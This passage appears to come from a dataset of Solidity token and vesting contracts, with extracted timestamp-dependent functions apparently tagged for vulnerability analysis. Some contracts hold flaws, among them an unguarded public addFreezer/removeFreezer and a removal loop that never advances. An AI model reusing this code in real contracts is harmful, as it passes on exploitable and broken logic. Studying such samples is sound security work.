balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract OwnedPausableToken is StandardToken, Pausable {\n modifier whenNotPausedOrIsOwner() {\n require(!paused || msg.sender == owner);\n _;\n }\n function transfer(address _to, uint256 _value) public whenNotPausedOrIsOwner returns (bool) {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused returns (bool) {\n return super.transferFrom(_from, _to, _value);\n }\n function approve(address _spender, uint256 _value) public whenNotPaused returns (bool) {\n return super.approve(_spender, _value);\n }\n function increaseApproval(address _spender, uint _addedValue) public whenNotPaused returns (bool success) {\n return super.increaseApproval(_spender, _addedValue);\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public whenNotPaused returns (bool success) {\n return super.decreaseApproval(_spender, _subtractedValue);\n }\n}\ncontract IDAVToken is ERC20 {\n function name() public view returns (string) {}\n function symbol() public view returns (string) {}\n function decimals() public view returns (uint8) {}\n function increaseApproval(address _spender, uint _addedValue) public returns (bool success);\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool success);\n function owner() public view returns (address) {}\n function transferOwnership(address newOwner) public;\n function burn(uint256 _value) public;\n function pauseCutoffTime() public view returns (uint256) {}\n function paused() public view returns (bool) {}\n function pause() public;\n function unpause() public;\n function setPauseCutoffTime(uint256 _pauseCutoffTime) public;\n}\ncontract BurnableToken is BasicToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n _burn(msg.sender, _value);\n }\n function _burn(address _who, uint256 _value) internal {\n require(_value <= balances[_who]);\n balances[_who] = balances[_who].sub(_value);\n totalSupply_ = totalSupply_.sub(_value);\n emit Burn(_who, _value);\n emit Transfer(_who, address(0), _value);\n }\n}\ncontract DAVToken is IDAVToken, BurnableToken, OwnedPausableToken {\n string public name = 'DAV Token';\n string public symbol = 'DAV';\n uint8 public decimals = 18;\n uint256 public pauseCutoffTime;\n constructor(uint256 _initialSupply) public {\n totalSupply_ = _initialSupply;\n balances[msg.sender] = totalSupply_;\n }\n function setPauseCutoffTime(uint256 _pauseCutoffTime) onlyOwner public {\n require(_pauseCutoffTime >= block.timestamp);\n require(pauseCutoffTime == 0);\n pauseCutoffTime = _pauseCutoffTime;\n }\n function pause() onlyOwner whenNotPaused public {\n require(pauseCutoffTime == 0 || pauseCutoffTime >= block.timestamp);\n paused = true;\n emit Pause();\n }\n}\ncontract Identity {\n struct DAVIdentity {\n address wallet;\n }\n mapping (address => DAVIdentity) private identities;\n DAVToken private token;\n bytes28 private constant ETH_SIGNED_MESSAGE_PREFIX = '\\x19Ethereum Signed Message:\\n32';\n bytes25 private constant DAV_REGISTRATION_REQUEST = 'DAV Identity Registration';\n function Identity(DAVToken _davTokenContract) public {\n token = _davTokenContract;\n }\n function register(address _id, uint8 _v, bytes32 _r, bytes32 _s) public {\n require(\n identities[_id].wallet == 0x0\n );\n bytes32 prefixedHash = keccak256(ETH_SIGNED_MESSAGE_PREFIX, keccak256(DAV_REGISTRATION_REQUEST));\n require(\n ecrecover(prefixedHash, _v, _r, _s) == _id\n );\n identities[_id] = DAVIdentity({\n wallet: msg.sender\n });\n }\n function registerSimple() public {\n require(\n identities[msg.sender].wallet == 0x0\n );\n identities[msg.sender] = DAVIdentity({\n wallet: msg.sender\n });\n }\n function getBalance(address _id) public view returns (uint256 balance) {\n return token.balanceOf(identities[_id].wallet);\n }\n function verifyOwnership(address _id, address _wallet) public view returns (bool verified) {\n return identities[_id].wallet == _wallet;\n }\n function isRegistered(address _id) public view returns (bool) {\n return identities[_id].wallet != 0x0;\n }\n function getIdentityWallet(address _id) public view returns (address) {\n return identities[_id].wallet;\n }\n}",
  "extract_feature": [
    "function setPauseCutoffTime(uint256 _pauseCutoffTime) onlyOwner public {\nrequire(_pauseCutoffTime >= block.timestamp);\nrequire(pauseCutoffTime == 0);\npauseCutoffTime = _pauseCutoffTime;\n}",
    "function pause() onlyOwner whenNotPaused public {\nrequire(pauseCutoffTime == 0 || pauseCutoffTime >= block.timestamp);\npaused = true;\nemit Pause();\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa7fa0e1460cdfa1ec1"
  },
  "filename": "10369.sol",
  "content": "pragma solidity ^0.4.18;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract MuskToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function MuskToken(\n ) {\n balances[msg.sender] = 1000000000000000000000000000;\n totalSupply = 1000000000000000000000000000;\n name = \"Musk Token\";\n decimals = 18;\n symbol = \"MUSK\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract MuskTokenVault is Ownable {\n using SafeMath for uint256;\n address public teamReserveWallet = 0xBf7E6DC9317dF0e9Fde7847577154e6C5114370d;\n address public finalReserveWallet = 0xBf7E6DC9317dF0e9Fde7847577154e6C5114370d;\n uint256 public teamReserveAllocation = 240 * (10 ** 6) * (10 ** 18);\n uint256 public finalReserveAllocation = 10 * (10 ** 6) * (10 ** 18);\n uint256 public totalAllocation = 250 * (10 ** 6) * (10 ** 18);\n uint256 public teamTimeLock = 2 * 365 days;\n uint256 public teamVestingStages = 8;\n uint256 public finalReserveTimeLock = 2 * 365 days;\n mapping(address => uint256) public allocations;\n mapping(address => uint256) public timeLocks;\n mapping(address => uint256) public claimed;\n uint256 public lockedAt = 0;\n MuskToken public token;\n event Allocated(address wallet, uint256 value);\n event Distributed(address wallet, uint256 value);\n event Locked(uint256 lockTime);\n modifier onlyReserveWallets {\n require(allocations[msg.sender] > 0);\n _;\n }\n modifier onlyTeamReserve {\n require(msg.sender == teamReserveWallet);\n require(allocations[msg.sender] > 0);\n _;\n }\n modifier onlyTokenReserve {\n require(msg.sender == finalReserveWallet);\n require(allocations[msg.sender] > 0);\n _;\n }\n modifier notLocked {\n require(lockedAt == 0);\n _;\n }\n modifier locked {\n require(lockedAt > 0);\n _;\n }\n modifier notAllocated {\n require(allocations[teamReserveWallet] == 0);\n require(allocations[finalReserveWallet] == 0);\n _;\n }\n function MuskTokenVault(Token _token) public {\n owner = msg.sender;\n token = MuskToken(_token);\n }\n function allocate() public notLocked notAllocated onlyOwner {\n require(token.balanceOf(address(this)) == totalAllocation);\n allocations[teamReserveWallet] = teamReserveAllocation;\n allocations[finalReserveWallet] = finalReserveAllocation;\n Allocated(teamReserveWallet, teamReserveAllocation);\n Allocated(finalReserveWallet, finalReserveAllocation);\n lock();\n }\n function lock() internal notLocked onlyOwner {\n lockedAt = block.timestamp;\n timeLocks[teamReserveWallet] = lockedAt.add(teamTimeLock);\n timeLocks[finalReserveWallet] = lockedAt.add(finalReserveTimeLock);\n Locked(lockedAt);\n }\n function recoverFailedLock() external notLocked notAllocated onlyOwner {\n require(token.transfer(owner, token.balanceOf(address(this))));\n }\n function getTotalBalance() public view returns (uint256 tokensCurrentlyInVault) {\n return token.balanceOf(address(this));\n }\n function getLockedBalance() public view onlyReserveWallets returns (uint256 tokensLocked) {\n return allocations[msg.sender].sub(claimed[msg.sender]);\n }\n function claimTokenReserve() onlyTokenReserve locked public {\n address reserveWallet = msg.sender;\n require(block.timestamp > timeLocks[reserveWallet]);\n require(claimed[reserveWallet] == 0);\n uint256 amount = allocations[reserveWallet];\n claimed[reserveWallet] = amount;\n require(token.transfer(reserveWallet, amount));\n Distributed(reserveWallet, amount);\n }\n function claimTeamReserve() onlyTeamReserve locked public {\n uint256 vestingStage = teamVestingStage();\n uint256 totalUnlocked = vestingStage.mul(allocations[teamReserveWallet]).div(teamVestingStages);\n require(totalUnlocked <= allocations[teamReserveWallet]);\n require(claimed[teamReserveWallet] < totalUnlocked);\n uint256 payment = totalUnlocked.sub(claimed[teamReserveWallet]);\n claimed[teamReserveWallet] = totalUnlocked;\n require(token.transfer(teamReserveWallet, payment));\n Distributed(teamReserveWallet, payment);\n }\n function teamVestingStage() public view onlyTeamReserve returns(uint256){\n uint256 vestingMonths = teamTimeLock.div(teamVestingStages);\n uint256 stage = (block.timestamp.sub(lockedAt)).div(vestingMonths);\n if(stage > teamVestingStages){\n stage = teamVestingStages;\n }\n return stage;\n }\n function canCollect() public view onlyReserveWallets returns(bool) {\n return block.timestamp > timeLocks[msg.sender] && claimed[msg.sender] == 0;\n }\n}",
  "extract_feature": [
    "function lock() internal notLocked onlyOwner {\nlockedAt = block.timestamp;\ntimeLocks[teamReserveWallet] = lockedAt.add(teamTimeLock);\ntimeLocks[finalReserveWallet] = lockedAt.add(finalReserveTimeLock);\nLocked(lockedAt);\n}",
    "function claimTokenReserve() onlyTokenReserve locked public {\naddress reserveWallet = msg.sender;\nrequire(block.timestamp > timeLocks[reserveWallet]);\nrequire(claimed[reserveWallet] == 0);\nuint256 amount = allocations[reserveWallet];\nclaimed[reserveWallet] = amount;\nrequire(token.transfer(reserveWallet, amount));\nDistributed(reserveWallet, amount);\n}",
    "function teamVestingStage() public view onlyTeamReserve returns(uint256){\nuint256 vestingMonths = teamTimeLock.div(teamVestingStages);\nuint256 stage = (block.timestamp.sub(lockedAt)).div(vestingMonths);\nif(stage > teamVestingStages){\nstage = teamVestingStages;\n}\nreturn stage;\n}",
    "function canCollect() public view onlyReserveWallets returns(bool) {\nreturn block.timestamp > timeLocks[msg.sender] && claimed[msg.sender] == 0;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa7fa0e1460cdfa1ec2"
  },
  "filename": "10431.sol",
  "content": "pragma solidity ^0.4.21;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract StandardToken {\n using SafeMath for uint256;\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n mapping(address => uint256) internal balances_;\n mapping(address => mapping(address => uint256)) internal allowed_;\n uint256 internal totalSupply_;\n string public name;\n string public symbol;\n uint8 public decimals;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances_[_owner];\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed_[_owner][_spender];\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances_[msg.sender]);\n balances_[msg.sender] = balances_[msg.sender].sub(_value);\n balances_[_to] = balances_[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances_[_from]);\n require(_value <= allowed_[_from][msg.sender]);\n balances_[_from] = balances_[_from].sub(_value);\n balances_[_to] = balances_[_to].add(_value);\n allowed_[_from][msg.sender] = allowed_[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed_[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n}\ncontract EthTeamContract is StandardToken, Ownable {\n event Buy(address indexed token, address indexed from, uint256 value, uint256 weiValue);\n event Sell(address indexed token, address indexed from, uint256 value, uint256 weiValue);\n event BeginGame(address indexed team1, address indexed team2, uint64 gameTime);\n event EndGame(address indexed team1, address indexed team2, uint8 gameResult);\n event ChangeStatus(address indexed team, uint8 status);\n uint256 public price;\n uint8 public status;\n uint64 public gameTime;\n uint64 public finishTime;\n address public feeOwner;\n address public gameOpponent;\n function EthTeamContract(\n string _teamName, string _teamSymbol, address _gameOpponent, uint64 _gameTime, uint64 _finishTime, address _feeOwner\n ) public {\n name = _teamName;\n symbol = _teamSymbol;\n decimals = 3;\n totalSupply_ = 0;\n price = 1 szabo;\n gameOpponent = _gameOpponent;\n gameTime = _gameTime;\n finishTime = _finishTime;\n feeOwner = _feeOwner;\n owner = msg.sender;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n if (_to != address(this)) {\n return super.transfer(_to, _value);\n }\n require(_value <= balances_[msg.sender] && status == 0);\n if (gameTime > 1514764800) {\n require(gameTime - 300 > block.timestamp);\n }\n balances_[msg.sender] = balances_[msg.sender].sub(_value);\n totalSupply_ = totalSupply_.sub(_value);\n uint256 weiAmount = price.mul(_value);\n msg.sender.transfer(weiAmount);\n emit Transfer(msg.sender, _to, _value);\n emit Sell(_to, msg.sender, _value, weiAmount);\n return true;\n }\n function() payable public {\n require(status == 0 && price > 0);\n if (gameTime > 1514764800) {\n require(gameTime - 300 > block.timestamp);\n }\n uint256 amount = msg.value.div(price);\n balances_[msg.sender] = balances_[msg.sender].add(amount);\n totalSupply_ = totalSupply_.add(amount);\n emit Transfer(address(this), msg.sender, amount);\n emit Buy(address(this), msg.sender, amount, msg.value);\n }\n function changeStatus(uint8 _status) onlyOwner public {\n require(status != _status);\n status = _status;\n emit ChangeStatus(address(this), _status);\n }\n function finish() onlyOwner public {\n require(block.timestamp >= finishTime);\n feeOwner.transfer(address(this).balance);\n }\n function beginGame(address _gameOpponent, uint64 _gameTime) onlyOwner public {\n require(_gameOpponent != address(0) && _gameOpponent != address(this) && gameOpponent == address(0));\n require(_gameTime == 0 || (_gameTime > 1514764800));\n gameOpponent = _gameOpponent;\n gameTime = _gameTime;\n status = 0;\n emit BeginGame(address(this), _gameOpponent, _gameTime);\n }\n function endGame(address _gameOpponent, uint8 _gameResult) onlyOwner public {\n require(gameOpponent != address(0) && gameOpponent == _gameOpponent);\n uint256 amount = address(this).balance;\n uint256 opAmount = gameOpponent.balance;\n require(_gameResult == 1 || (_gameResult == 2 && amount >= opAmount) || _gameResult == 3);\n EthTeamContract op = EthTeamContract(gameOpponent);\n if (_gameResult == 1) {\n if (amount > 0 && totalSupply_ > 0) {\n uint256 lostAmount = amount;\n if (op.totalSupply() > 0) {\n uint256 feeAmount = lostAmount.div(20);\n lostAmount = lostAmount.sub(feeAmount);\n feeOwner.transfer(feeAmount);\n op.transferFundAndEndGame.value(lostAmount)();\n } else {\n feeOwner.transfer(lostAmount);\n op.transferFundAndEndGame();\n }\n } else {\n op.transferFundAndEndGame();\n }\n } else if (_gameResult == 2) {\n if (amount > opAmount) {\n lostAmount = amount.sub(opAmount).div(2);\n if (op.totalSupply() > 0) {\n feeAmount = lostAmount.div(20);\n lostAmount = lostAmount.sub(feeAmount);\n feeOwner.transfer(feeAmount);\n op.transferFundAndEndGame.value(lostAmount)();\n } else {\n feeOwner.transfer(lostAmount);\n op.transferFundAndEndGame();\n }\n } else if (amount == opAmount) {\n op.transferFundAndEndGame();\n } else {\n revert();\n }\n } else if (_gameResult == 3) {\n op.transferFundAndEndGame();\n } else {\n revert();\n }\n endGameInternal();\n if (totalSupply_ > 0) {\n price = address(this).balance.div(totalSupply_);\n }\n emit EndGame(address(this), _gameOpponent, _gameResult);\n }\n function endGameInternal() private {\n gameOpponent = address(0);\n gameTime = 0;\n status = 0;\n }\n function transferFundAndEndGame() payable public {\n require(gameOpponent != address(0) && gameOpponent == msg.sender);\n if (msg.value > 0 && totalSupply_ > 0) {\n price = address(this).balance.div(totalSupply_);\n }\n endGameInternal();\n }\n}",
  "extract_feature": [
    "function transfer(address _to, uint256 _value) public returns (bool) {\nif (_to != address(this)) {\nreturn super.transfer(_to, _value);\n}\nrequire(_value <= balances_[msg.sender] && status == 0);\nif (gameTime > 1514764800) {\nrequire(gameTime - 300 > block.timestamp);\n}\nbalances_[msg.sender] = balances_[msg.sender].sub(_value);\ntotalSupply_ = totalSupply_.sub(_value);\nuint256 weiAmount = price.mul(_value);\nmsg.sender.transfer(weiAmount);\nemit Transfer(msg.sender, _to, _value);\nemit Sell(_to, msg.sender, _value, weiAmount);\nreturn true;\n}",
    "function finish() onlyOwner public {\nrequire(block.timestamp >= finishTime);\nfeeOwner.transfer(address(this).balance);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa7fa0e1460cdfa1ec3"
  },
  "filename": "1051.sol",
  "content": "pragma solidity 0.4.23;\ncontract DSAuthority {\n function canCall(\n address src, address dst, bytes4 sig\n ) public view returns (bool);\n}\ncontract DSAuthEvents {\n event LogSetAuthority (address indexed authority);\n event LogSetOwner (address indexed owner);\n}\ncontract DSAuth is DSAuthEvents {\n DSAuthority public authority;\n address public owner;\n constructor() public {\n owner = msg.sender;\n emit LogSetOwner(msg.sender);\n }\n function setOwner(address owner_)\n public\n auth\n {\n owner = owner_;\n emit LogSetOwner(owner);\n }\n function setAuthority(DSAuthority authority_)\n public\n auth\n {\n authority = authority_;\n emit LogSetAuthority(authority);\n }\n modifier auth {\n require(isAuthorized(msg.sender, msg.sig));\n _;\n }\n function isAuthorized(address src, bytes4 sig) internal view returns (bool) {\n if (src == address(this)) {\n return true;\n } else if (src == owner) {\n return true;\n } else if (authority == DSAuthority(0)) {\n return false;\n } else {\n return authority.canCall(src, this, sig);\n }\n }\n}\ncontract DSNote {\n event LogNote(\n bytes4 indexed sig,\n address indexed guy,\n bytes32 indexed foo,\n bytes32 indexed bar,\n uint wad,\n bytes fax\n ) anonymous;\n modifier note {\n bytes32 foo;\n bytes32 bar;\n assembly {\n foo := calldataload(4)\n bar := calldataload(36)\n }\n emit LogNote(msg.sig, msg.sender, foo, bar, msg.value, msg.data);\n _;\n }\n}\ncontract DSStop is DSNote, DSAuth {\n bool public stopped;\n modifier stoppable {\n require(!stopped);\n _;\n }\n function stop() public auth note {\n stopped = true;\n }\n function start() public auth note {\n stopped = false;\n }\n}\ncontract DSMath {\n function add(uint x, uint y) internal pure returns (uint z) {\n require((z = x + y) >= x);\n }\n function sub(uint x, uint y) internal pure returns (uint z) {\n require((z = x - y) <= x);\n }\n function mul(uint x, uint y) internal pure returns (uint z) {\n require(y == 0 || (z = x * y) / y == x);\n }\n}\ncontract ERC20 {\n function totalSupply() constant public returns (uint256 supply);\n function balanceOf(address _owner) constant public returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) constant public returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract Coin is ERC20, DSStop {\n string public name;\n string public symbol;\n uint8 public decimals = 18;\n uint256 internal c_totalSupply;\n mapping(address => uint256) internal c_balances;\n mapping(address => mapping(address => uint256)) internal c_approvals;\n function init(uint256 token_supply, string token_name, string token_symbol) internal {\n c_balances[msg.sender] = token_supply;\n c_totalSupply = token_supply;\n name = token_name;\n symbol = token_symbol;\n }\n function() public {\n assert(false);\n }\n function setName(string _name) auth public {\n name = _name;\n }\n function totalSupply() constant public returns (uint256) {\n return c_totalSupply;\n }\n function balanceOf(address _owner) constant public returns (uint256) {\n return c_balances[_owner];\n }\n function approve(address _spender, uint256 _value) public stoppable returns (bool) {\n require(msg.data.length >= (2 * 32) + 4);\n require(_value == 0 || c_approvals[msg.sender][_spender] == 0);\n require(_value < c_totalSupply);\n c_approvals[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant public returns (uint256) {\n return c_approvals[_owner][_spender];\n }\n}\ncontract FreezerAuthority is DSAuthority {\n address[] internal c_freezers;\n bytes4 constant setFreezingSig = bytes4(0x51c3b8a6);\n bytes4 constant transferAndFreezingSig = bytes4(0xb8a1fdb6);\n function canCall(address caller, address, bytes4 sig) public view returns (bool) {\n if (isFreezer(caller) && (sig == setFreezingSig || sig == transferAndFreezingSig)) {\n return true;\n } else {\n return false;\n }\n }\n function addFreezer(address freezer) public {\n int i = indexOf(c_freezers, freezer);\n if (i < 0) {\n c_freezers.push(freezer);\n }\n }\n function removeFreezer(address freezer) public {\n int index = indexOf(c_freezers, freezer);\n if (index >= 0) {\n uint i = uint(index);\n while (i < c_freezers.length - 1) {\n c_freezers[i] = c_freezers[i + 1];\n }\n c_freezers.length--;\n }\n }\n function indexOf(address[] values, address value) internal pure returns (int) {\n uint i = 0;\n while (i < values.length) {\n if (values[i] == value) {\n return int(i);\n }\n i++;\n }\n return int(- 1);\n }\n function isFreezer(address addr) public constant returns (bool) {\n return indexOf(c_freezers, addr) >= 0;\n }\n}\ncontract LimitCollectCoin is Coin, DSMath {\n struct FreezingNode {\n uint end_stamp;\n uint num_lccs;\n uint8 freezing_type;\n }\n mapping(address => FreezingNode[]) internal c_freezing_list;\n constructor(uint256 token_supply, string token_name, string token_symbol) public {\n init(token_supply, token_name, token_symbol);\n setAuthority(new FreezerAuthority());\n }\n function addFreezer(address freezer) auth public {\n FreezerAuthority(authority).addFreezer(freezer);\n }\n function removeFreezer(address freezer) auth public {\n FreezerAuthority(authority).removeFreezer(freezer);\n }\n event ClearExpiredFreezingEvent(address indexed addr);\n event SetFreezingEvent(address indexed addr, uint end_stamp, uint num_lccs, uint8 indexed freezing_type);\n function clearExpiredFreezing(address addr) public {\n FreezingNode[] storage nodes = c_freezing_list[addr];\n uint length = nodes.length;\n uint left = 0;\n while (left < length) {\n if (nodes[left].end_stamp <= block.timestamp) {\n break;\n }\n left++;\n }\n uint right = left + 1;\n while (left < length && right < length) {\n if (nodes[right].end_stamp > block.timestamp) {\n nodes[left] = nodes[right];\n left++;\n }\n right++;\n }\n if (length != left) {\n nodes.length = left;\n emit ClearExpiredFreezingEvent(addr);\n }\n }\n function validBalanceOf(address addr) constant public returns (uint) {\n FreezingNode[] memory nodes = c_freezing_list[addr];\n uint length = nodes.length;\n uint total_lccs = balanceOf(addr);\n for (uint i = 0; i < length; ++i) {\n if (nodes[i].end_stamp > block.timestamp) {\n total_lccs = sub(total_lccs, nodes[i].num_lccs);\n }\n }\n return total_lccs;\n }\n function freezingBalanceNumberOf(address addr) constant public returns (uint) {\n return c_freezing_list[addr].length;\n }\n function freezingBalanceInfoOf(address addr, uint index) constant public returns (uint, uint, uint8) {\n return (c_freezing_list[addr][index].end_stamp, c_freezing_list[addr][index].num_lccs, uint8(c_freezing_list[addr][index].freezing_type));\n }\n function setFreezing(address addr, uint end_stamp, uint num_lccs, uint8 freezing_type) auth stoppable public {\n require(block.timestamp < end_stamp);\n require(num_lccs < c_totalSupply);\n clearExpiredFreezing(addr);\n uint valid_balance = validBalanceOf(addr);\n require(valid_balance >= num_lccs);\n FreezingNode memory node = FreezingNode(end_stamp, num_lccs, freezing_type);\n c_freezing_list[addr].push(node);\n emit SetFreezingEvent(addr, end_stamp, num_lccs, freezing_type);\n }\n function transferAndFreezing(address _to, uint256 _value, uint256 freeze_amount, uint end_stamp, uint8 freezing_type) auth stoppable public returns (bool) {\n require(_value < c_totalSupply);\n require(freeze_amount <= _value);\n transfer(_to, _value);\n setFreezing(_to, end_stamp, freeze_amount, freezing_type);\n return true;\n }\n function transfer(address _to, uint256 _value) stoppable public returns (bool) {\n require(msg.data.length >= (2 * 32) + 4);\n require(_value < c_totalSupply);\n clearExpiredFreezing(msg.sender);\n uint from_lccs = validBalanceOf(msg.sender);\n require(from_lccs >= _value);\n c_balances[msg.sender] = sub(c_balances[msg.sender], _value);\n c_balances[_to] = add(c_balances[_to], _value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) stoppable public returns (bool) {\n require(_value < c_totalSupply);\n require(c_approvals[_from][msg.sender] >= _value);\n clearExpiredFreezing(_from);\n uint from_lccs = validBalanceOf(_from);\n require(from_lccs >= _value);\n c_approvals[_from][msg.sender] = sub(c_approvals[_from][msg.sender], _value);\n c_balances[_from] = sub(c_balances[_from], _value);\n c_balances[_to] = add(c_balances[_to], _value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n}",
  "extract_feature": [
    "function clearExpiredFreezing(address addr) public {\nFreezingNode[] storage nodes = c_freezing_list[addr];\nuint length = nodes.length;\nuint left = 0;\nwhile (left < length) {\nif (nodes[left].end_stamp <= block.timestamp) {\nbreak;\n}\nleft++;\n}\nuint right = left + 1;\nwhile (left < length && right < length) {\nif (nodes[right].end_stamp > block.timestamp) {\nnodes[left] = nodes[right];\nleft++;\n}\nright++;\n}\nif (length != left) {\nnodes.length = left;\nemit ClearExpiredFreezingEvent(addr);\n}\n}",
    "function validBalanceOf(address addr) constant public returns (uint) {\nFreezingNode[] memory nodes = c_freezing_list[addr];\nuint length = nodes.length;\nuint total_lccs = balanceOf(addr);\nfor (uint i = 0; i < length; ++i) {\nif (nodes[i].end_stamp > block.timestamp) {\ntotal_lccs = sub(total_lccs, nodes[i].num_lccs);\n}\n}\nreturn total_lccs;\n}",
    "function setFreezing(address addr, uint end_stamp, uint num_lccs, uint8 freezing_type) auth stoppable public {\nrequire(block.timestamp < end_stamp);\nrequire(num_lccs < c_totalSupply);\nclearExpiredFreezing(addr);\nuint valid_balance = validBalanceOf(addr);\nrequire(valid_balance >= num_lccs);\nFreezingNode memory node = FreezingNode(end_stamp, num_lccs, freezing_type);\nc_freezing_list[addr].push(node);\nemit SetFreezingEvent(addr, end_stamp, num_lccs, freezing_type);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa7fa0e1460cdfa1ec4"
  },
  "filename": "10547.sol",
